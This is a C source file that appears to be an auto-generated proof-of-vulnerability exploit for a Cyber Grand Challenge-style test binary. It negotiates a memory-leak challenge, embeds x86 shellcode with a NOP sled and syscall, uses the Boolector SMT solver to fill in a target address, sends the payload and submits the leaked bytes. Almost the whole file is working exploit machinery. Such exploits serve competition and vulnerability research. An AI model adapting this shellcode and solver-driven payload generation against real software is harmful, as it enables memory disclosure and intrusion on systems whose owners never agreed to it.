
#include <libcgc.h>
#include <stdlib.h>
#include <string.h>
#include <boolector.h>

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

void die(char *str) { 
  transmit(2, str, strlen(str), NULL);
  _terminate(1);
}

unsigned int bswap32(unsigned int x) {
    return (((x) & 0x000000ff) << 24) | (((x) & 0x0000ff00) << 8) |         (((x) & 0x00ff0000) >> 8) | (((x) & 0xff000000) >> 24);
}

// receive into no particular buffer
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

void debug_print(const char *msg) {
  size_t len = (size_t)strlen(msg);
  transmit(2, msg, len, 0);
}

size_t receive_n( int fd, void *dst_buf, size_t n_bytes )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int fd_ready_timeout(int fd, int timeout_us) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = timeout_us/1000000;
  tv.tv_usec = timeout_us % 1000000;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

void safe_memcpy(char *dst, char *src, int len) {
  char *foo = malloc(len);
  memcpy(foo, src, len);
  memcpy(dst, foo, len);
  free(foo);
}

void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
  void* pNew = realloc(pBuffer, newSize);
  if ( newSize > oldSize && pNew ) {
    size_t diff = newSize - oldSize;
    void* pStart = ((char*)pNew) + oldSize;
    memset(pStart, 0, diff);
  }
  return pNew;
}

int get_int_len(char *start, int base, int max) {
  char buf[0x20] = {0};
  memcpy(buf, start, max);
  char *endptr = 0;
  strtoul(buf, &endptr, base);
  if (endptr - buf > max) {
    return max;
  }
  return endptr - buf;
}

char *strrev (char *str)
{
  int i;
  int len = 0;
  char c;
  if (!str)
    return NULL;
  while(str[len] != '\0'){
    len++;
  }
  for(i = 0; i < (len/2); i++)
  {
    c = str[i];
    str [i] = str[len - i - 1];
    str[len - i - 1] = c;
  }
  return str;
}

int itoa_len(int num, unsigned char* str, int len, int base)
{
  int negative = 0;
  if (num < 0) {
    negative = 1;
    num = -num;
    len -= 1;
  }

  int sum = num;
  int i = 0;
  int digit;

  if (len == 0)
    return -1;
  do
  {
    digit = sum % base;
    if (digit < 0xA)
      str[i++] = '0' + digit;
    else
      str[i++] = 'A' + digit - 0xA;
    sum /= base;
  } while (sum && (i < (len - 1)));
  if (i == (len - 1) && sum)
    return -1;

  if (negative) {
    str[i] = '-';
    i++;
  }

  str[i] = '\0';
  strrev((char*)str);
  return 0;
}

size_t receive_n_timeout( int fd, void *dst_buf, size_t n_bytes, int timeout_us )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (!fd_ready_timeout(fd, timeout_us)) {
      return len;
    }
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    if (rx == 0) {
      return len;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

char to_char(char *str) {
  int i;
  char r = '\0';

  if (strlen(str) != 8)
    die("bv_assignment returned a string not of length 8\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

unsigned int to_int(char *str) {
  int i;
  int r = 0;

  if (strlen(str) != 32)
    die("bv_assignment returned a string not of length 32\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<32;i++)
    r |= ((str[31-i] - '0') & 1) << i;

  return r;
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}

// globals!
type2_vals t2vals;
char *received_data = NULL;
char *payload = NULL;
size_t payload_buffer_len;
size_t recv_buf_len;
const size_t payload_len = 0x34;

// INTEGER STUFF
// the integers must be ordered by start loc
size_t payload_int_start_locs[] = {};
int payload_int_bases[] = {};
int payload_int_expected_lens[] = {};
// +1 to silence the warning if it's 0
int payload_int_corrections[0+1] = {0};
size_t recv_int_start_locs[] = {};
int recv_int_expected_lens[] = {};
int recv_int_corrections[0+1] = {0};
int recv_int_bases[] = {};


// function to get the real offsets
size_t real_payload_off(size_t payload_off) {
  size_t out_off = payload_off;
  for (int i = 0; i < 0; i++) {
    if (payload_off > payload_int_start_locs[i]+1) {
      out_off += payload_int_corrections[i];
    }
  }
  return out_off;
}

size_t real_recv_off(size_t recv_off) {
  size_t out_off = recv_off;
  for (int i = 0; i < 0; i++) {
    if (recv_off > recv_int_start_locs[i]+1) {
      out_off += recv_int_corrections[i];
    }
  }
  return out_off;
}

size_t check_for_recv_extra(size_t recv_start, size_t num_bytes) {
  size_t num_extra = 0;
  for (int i = 0; i < 0; i++) {
    if (recv_start <= recv_int_start_locs[i] && recv_start+num_bytes > recv_int_start_locs[i]) {
      num_extra += 8;
    }
  }
  return num_extra;
}

size_t fixup_recv_amount(size_t recv_off, size_t recv_amount) {
  // we want the recv amount to be what it would be if all integer lengths were the same
  size_t fixed_recv_amount = recv_amount;
  for (int i = 0; i < 0; i++) {
    if (recv_off <= recv_int_start_locs[i] && recv_off+recv_amount > recv_int_start_locs[i]) {
      // we read in an integer, get the length of the integer we read
      int len = get_int_len(received_data+real_recv_off(recv_int_start_locs[i]), recv_int_bases[i], recv_amount-(recv_int_start_locs[i]-recv_off));
      // store the difference between it and the expected length
      recv_int_corrections[i] = len-recv_int_expected_lens[i];
      // fix recv amount
      fixed_recv_amount -= recv_int_corrections[i];
    }
  }
  return fixed_recv_amount;
}

void set_payload_int_solve_result(Btor *btor, int bid, int base, int int_info_num) {
  char temp_int_buf[0x20] = {0};
  // get the solve result
  BoolectorNode *int_val = boolector_match_node_by_id(btor, bid);
  int temp_int = to_int(boolector_bv_assignment(btor, int_val));

  // convert to ascii
  itoa_len(temp_int, (unsigned char*)temp_int_buf, sizeof(temp_int_buf), base);
  // get the length, and the expected length
  int int_len = strlen(temp_int_buf);
  int expected_len = payload_int_expected_lens[int_info_num];
  int correction = int_len - expected_len;

  // now we move stuff if needed
  int real_int_start = real_payload_off(payload_int_start_locs[int_info_num]);
  // only move stuff if the correction wasn't set
  if (payload_int_corrections[int_info_num] != correction) {
    int dest_off = real_int_start + int_len;
    int current_off = real_int_start + expected_len + payload_int_corrections[int_info_num];
    // realloc if needed
    if (current_off > dest_off) {
      size_t old_payload_buffer_len = payload_buffer_len;
      payload_buffer_len += current_off - dest_off;
      payload = realloc_zero(payload, old_payload_buffer_len, payload_buffer_len);
    }
    safe_memcpy(payload + dest_off, payload + current_off, real_payload_off(payload_len)-current_off);
    payload_int_corrections[int_info_num] = correction;
  }
  memcpy(payload + real_int_start, temp_int_buf, int_len);

}

// end of fixup codes

void constrain_address_var(Btor *btor, int address_var_idx) {
  BoolectorNode *address_val_var = boolector_match_node_by_id(btor, address_var_idx);
  BoolectorNode *address_val = boolector_int(btor, t2vals.region_addr, 32);
  BoolectorNode *upper_val = boolector_int(btor, (t2vals.region_addr + t2vals.region_size) - t2vals.read_size, 32);
  BoolectorNode *min_con = boolector_ugte(btor, address_val_var, address_val);
  BoolectorNode *max_con = boolector_ulte(btor, address_val_var, upper_val);
  boolector_assert(btor, min_con);
  boolector_assert(btor, max_con);
}

void constrain_length_var(Btor *btor, int length_var_idx) {
  BoolectorNode *length_val_var = boolector_match_node_by_id(btor, length_var_idx);
  BoolectorNode *min_length_val = boolector_int(btor, t2vals.read_size, 32);
  BoolectorNode *max_length_val = boolector_int(btor, 0xc0000000 - (t2vals.region_addr + t2vals.region_size), 32);
  BoolectorNode *min_length_con = boolector_ugte(btor, length_val_var, min_length_val);
  BoolectorNode *max_length_con = boolector_ulte(btor, length_val_var, max_length_val);
  boolector_assert(btor, min_length_con);
  boolector_assert(btor, max_length_con);
}

int do_pov() {
  if (type2_negotiate(&t2vals) != 0) {
    die("type 2 negotiate failure\n");
  }

  char *error;
  int status;

  const char orig_payload[] = "\xf2\xf4\x31\xf4\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x40\x40\x31\xdb\x43\xb9\x00\xc0\x47\x43\xba\xa8\xa4\x04\x08\x31\xf6\xcd\x80\xf4\xf4\xf4\xf4\x0c\xaf\xaa\xba";
  payload_buffer_len = payload_len;
  payload = malloc(payload_len);
  memcpy(payload, orig_payload, payload_len);
  recv_buf_len = 0x60;
  received_data = calloc(recv_buf_len, 1);

  BoolectorNode *cur_byte;

  // current position in they payload
  size_t payload_off = 0;
  size_t recv_off = 0;

  // *** integer stuff ***
  // a buffer for copying integers to and checking them
  char temp_int_buf[0x20];
  char *endptr;
  unsigned long temp_int;
  BoolectorNode *int_val;
  BoolectorNode *int_val_var;
  BoolectorNode *int_con;
  int recv_extra_for_int = 0;
  size_t fake_recv_amount = 0;
  size_t send_amount = 0;
  size_t recv_amount = 0;
  size_t old_recv_buf_len = 0;
  // *** end integer stuff ***


  // BoolectorNodes for use in challenge response
  BoolectorNode *stdout_val_var;
  BoolectorNode *stdout_val;
  BoolectorNode *stdout_con;
  BoolectorNode *payload_val;
  BoolectorNode *payload_val_var;
  BoolectorNode *payload_con;

  Btor *btor_0 = boolector_new();
  boolector_set_opt(btor_0, "model_gen", 1);
  const char *smt_stmt_btor_0 = "(declare-fun byte_1f () (_ BitVec 8))\n"
"(declare-fun byte_20 () (_ BitVec 8))\n"
"(declare-fun byte_21 () (_ BitVec 8))\n"
"(declare-fun byte_22 () (_ BitVec 8))\n"
"(declare-fun address_var () (_ BitVec 32))\n"
"(assert\n"
" (let ((?x2443 ((_ extract 31 24) address_var)))\n"
" (= byte_22 ?x2443)))\n"
"(assert\n"
" (let ((?x2539 ((_ extract 23 16) address_var)))\n"
" (= byte_21 ?x2539)))\n"
"(assert\n"
" (let ((?x348 ((_ extract 15 8) address_var)))\n"
" (= byte_20 ?x348)))\n"
"(assert\n"
" (let ((?x2465 ((_ extract 7 0) address_var)))\n"
" (= byte_1f ?x2465)))\n"
"(assert\n"
" (let (($x986 (and (= byte_1f (_ bv10 8)) (= ((_ extract 7 7) byte_1f) (_ bv0 1)))))\n"
" (not $x986)))\n"
"(assert\n"
" (bvule (_ bv1128775680 32) address_var))\n"
"(assert\n"
" (let (($x3219 (bvule (_ bv1128779776 32) address_var)))\n"
"(not $x3219)))\n"
;
  boolector_parse(btor_0, smt_stmt_btor_0, &error, &status);
  if (error)
    die(error);
  constrain_address_var(btor_0, 6);
  if (payload_off > 0x1f) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x1f)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 2);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x20) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x20)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 3);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x21) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x21)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 4);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x22) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x22)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 5);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (boolector_sat(btor_0) != 10){
    die("unsat\n");
  }

  cur_byte = boolector_match_node_by_id(btor_0, 2);
   payload[real_payload_off(31)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 3);
   payload[real_payload_off(32)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 4);
   payload[real_payload_off(33)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 5);
   payload[real_payload_off(34)] = to_char(boolector_bv_assignment(btor_0, cur_byte));



  send_all(1, payload+real_payload_off(payload_off), real_payload_off(payload_len)-real_payload_off(payload_off));

  // discard output
  blank_receive(0, 0x60-recv_off);

  unsigned char leak[0x1000];
  unsigned n = t2vals.read_size < sizeof(leak) ? t2vals.read_size : sizeof(leak);
  receive_n(0, leak, n);

  type2_submit(leak, t2vals.read_size);

  return 0;
}

int main(void) {
    /* align the stack so that boolector can work in all circumstances */
    asm("and $0xfffffff0, %esp\n");

    /* terminate, stack hasn't been fixed up */
    _terminate(do_pov());
}

